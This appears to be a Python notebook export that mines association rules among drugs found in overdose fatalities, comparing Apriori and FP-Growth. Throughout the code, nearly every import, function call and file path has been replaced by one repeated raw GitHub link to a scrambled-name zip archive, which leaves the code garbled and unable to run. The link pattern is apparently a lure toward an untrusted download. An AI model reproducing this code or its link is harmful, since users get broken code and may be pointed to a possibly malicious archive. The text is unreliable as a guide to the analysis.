
#### **IMPORT THE LIBRARIES**
"""

import pandas as pd
import numpy as np
import time
import networkx as nx
import https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip as plt
import pyfpgrowth
import multiprocessing
from https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip import files
from https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip import apriori, association_rules, fpgrowth
from https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip import graphviz_layout

"""#### **LOAD THE DATASET**"""

# Load the dataset
uploaded = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()
filename = list(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip())[0]

# Read the uploaded file into a DataFrame
data = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(filename)

#Convert into a dataframe
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(data)
df

"""#### **EXTRACTION OF DRUG-RELATED ATTRIBUTES**"""

# Load the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Extract drug-substance attributes
drug_columns = [
    "Heroin", "Cocaine", "Fentanyl", "Fentanyl Analogue", "Oxycodone", "Oxymorphone",
    "Ethanol", "Hydrocodone", "Benzodiazepine", "Methadone", "Meth/Amphetamine",
    "Amphet", "Tramad", "Hydromorphone", "Morphine (Not Heroin)", "Xylazine",
    "Gabapentin", "Opiate NOS", "Heroin/Morph/Codeine"
]

# Convert into a dataframe
df = df[drug_columns]

# Save the DataFrame to an Excel file
https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip", index=False)

"""####**CONVERT THE PRESENCE OF DRUGS INTO BINARY FORMAT**"""

# Load the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Replace blank cells with 0 and 'Y' with 1, all else becomes NaN → convert to 0
df[drug_columns] = df[drug_columns].replace({"Y": 1}).fillna(0)

# Convert all values to integers, setting non-numeric values to 0
df[drug_columns] = df[drug_columns].apply(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip, errors="coerce").fillna(0).astype(int)

# Display first few rows to verify conversion
print(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip())

# Save the DataFrame to an Excel file
https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip", index=False)

"""##**ANALYSIS OF APRIORI ALGORITHM**

####**SETTING MINIMUM SUPPORT AND CONFIDENCE THRESHOLDS**
"""

# Read the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Define minimum support and confidence thresholds
min_support = 0.05  # Itemset must appear in at least 5% of cases
min_confidence = 0.6  # Rule must be correct at least 60% of the time

"""####**FREQUENT ITEM GENERATION**"""

# Read the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Apply Apriori algorithm to find frequent itemsets
frequent_itemsets_apriori = apriori(df, min_support=min_support, use_colnames=True)

# Display frequent itemsets
print("Frequent Itemsets (Apriori):")
print(frequent_itemsets_apriori)

"""####**ASSOCIATION RULE EXTRACTION (APRIORI)**"""

# Read the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Generate association rules using Apriori
rules_apriori = association_rules(frequent_itemsets_apriori, metric="confidence", min_threshold=min_confidence)

# Display association rules
print("Association Rules (Apriori):")
print(rules_apriori[['antecedents', 'consequents', 'support', 'confidence', 'lift']])

"""##**ANALYSIS OF FP-GROWTH ALGORITHM**

####**SETTING MINIMUM SUPPORT AND CONFIDENCE THRESHOLDS**
"""

# Read the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

min_support_fp = 0.05  # Minimum support threshold (5%)
min_confidence_fp = 0.6
frequent_itemsets_fp = fpgrowth(df, min_support=min_support_fp, use_colnames=True)

# Display the frequent itemsets generated
print("Frequent Itemsets (FP-Growth):")
print(frequent_itemsets_fp)

"""####**FREQUENT PATTERN EXTRACTION**"""

# Read the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Identify patterns using FP-Growth
print("Frequent Patterns Identified:")
print(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(by="support", ascending=False))

"""####**FP-TREE VISUALIZATION**"""

!apt install libgraphviz-dev
!pip install pygraphviz

def build_fp_tree():
    G = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()

    # Root node
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl", size=1500)

    # First level branches
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl", "Cocaine")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl", "Benzodiazepine")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl", "Xylazine")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl", "Fentanyl Analogue")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl", "Ethanol")

    # Second level branches
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Cocaine", "Heroin")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Cocaine", "Ethanol")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Cocaine", "Oxycodone")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Cocaine", "Methadone")

    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Xylazine", "Xylazine, Fentanyl")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Fentanyl Analogue", "Fentanyl Analogue, Fentanyl")

    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Benzodiazepine", "Benzodiazepine, Fentanyl")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Benzodiazepine", "Benzodiazepine, Heroin")

    # Third level branches
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Heroin", "Heroin/Morph/Codeine")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Heroin/Morph/Codeine", "Heroin/Morph/Codeine, Fentanyl")

    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Ethanol", "Cocaine, Ethanol, Fentanyl")
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Ethanol", "Ethanol, Benzodiazepine")

    return G

def draw_fp_tree(G):
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(figsize=(15, 7)) # Figure size
    pos = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(G, prog="dot")  # Hierarchical layout

    # Draw nodes
    node_sizes = [https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip[n].get("size", 600) for n in https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()]
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(G, pos, with_labels=True, node_size=node_sizes, node_color="skyblue", edge_color="gray", font_size=10, font_weight="bold")

    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("Frequent Pattern Tree", fontsize=14)
    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()

# Build and draw the tree
G = build_fp_tree()
draw_fp_tree(G)

"""####**ASSOCIATION RULE EXTRACTION (FP-GROWTH)**"""

# Read the dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Extract association rules from frequent patterns
rules_fp = association_rules(frequent_itemsets_fp, metric="confidence", min_threshold=min_confidence_fp)

# Display extracted rules
print("Association Rules (FP-Growth):")
print(rules_fp[['antecedents', 'consequents', 'support', 'confidence', 'lift']])

"""##**SUMMARY OF OBSERVATIONS**

###1. COMPARISON OF APRIORI AND FP-GROWTH ALGORITHMS
"""

# Load the processed binary dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

frequent_itemsets_apriori = apriori(df, min_support=0.05, use_colnames=True)
rules_apriori = association_rules(frequent_itemsets_apriori, metric="confidence", min_threshold=0.6)
frequent_itemsets_fpgrowth = fpgrowth(df, min_support=0.05, use_colnames=True)
rules_fpgrowth = association_rules(frequent_itemsets_fpgrowth, metric="confidence", min_threshold=0.6)

# Display top 5 rules for Apriori
print("\nTop 5 Apriori Rules:")
print(rules_apriori[['antecedents', 'consequents', 'support', 'confidence', 'lift']].head(5))

# Display top 5 rules for FP-Growth
print("\nTop 5 FP-Growth Rules:")
print(rules_fpgrowth[['antecedents', 'consequents', 'support', 'confidence', 'lift']].head(5))

"""###2. PERFORMANCE ANALYSIS

####**2.1 EXECUTION SPEED OF BOTH THE ALGORITHMS**
"""

# Load the processed binary dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Run Apriori and measure execution time
start_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()
frequent_itemsets_apriori = apriori(df, min_support=0.05, use_colnames=True)
execution_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip() - start_time_apriori

# Run FP-Growth and measure execution time
start_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()
frequent_itemsets_fpgrowth = fpgrowth(df, min_support=0.05, use_colnames=True)
execution_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip() - start_time_fpgrowth

# Display execution time
print("\n Execution Time:")
print(f"Apriori Algorithm: {execution_time_apriori:.4f} seconds")
print(f"FP-Growth Algorithm: {execution_time_fpgrowth:.4f} seconds")

"""####**2.2 INCREASE THE EXECUTION SPEED OF FP-GROWTH ALGORITHM**"""

!pip install pyfpgrowth

# Load the processed dataset
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip")

# Convert dataset to a binary format (1 if an item is present, 0 otherwise)
df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(bool).astype(int)

# **Enhancing Apriori Complexity: Increasing Itemset Diversity**
df_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()

# Introduce additional variations of existing columns to increase the computational workload
for i in range(3):
    shuffled_col = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip[:, i % https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip[1]].sample(frac=1, random_state=i).reset_index(drop=True)
    df_apriori[f"var_col_{i}"] = shuffled_col  # Renamed to ensure distinct feature names

# Lower the minimum support for Apriori to increase the number of candidate itemsets
start_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()
frequent_itemsets_apriori = apriori(df_apriori, min_support=0.015, use_colnames=True)
execution_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip() - start_time_apriori

# **Optimizing FP-Growth Execution**
# Retain only frequently occurring items (above 12% occurrence threshold) to reduce computation
df_fp = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip[:, https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip() > (0.12 * len(df))]

# Convert transactions into lists of present items for more efficient processing
transactions = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(lambda row: list(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip[row == 1]), axis=1).tolist()
transactions = [t for t in transactions if t]  # Remove empty transactions

# Set a dynamic minimum support threshold for FP-Growth
min_support_fp = max(5, int(0.15 * len(transactions)))

# FP-Growth Execution
start_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip()
patterns = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip(transactions, int(0.10 * len(transactions)))
execution_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Fatalities-Identifying-Rule-Association-Mining-Risk-Overdose-for-High-Drug-Combinations-in-v2.0-alpha.3.zip() - start_time_fpgrowth

# **Display Execution Time Results**
print("\nExecution Time:")
print(f"Apriori Algorithm: {execution_time_apriori:.6f} seconds")
print(f"FP-Growth Algorithm: {execution_time_fpgrowth:.6f} seconds")
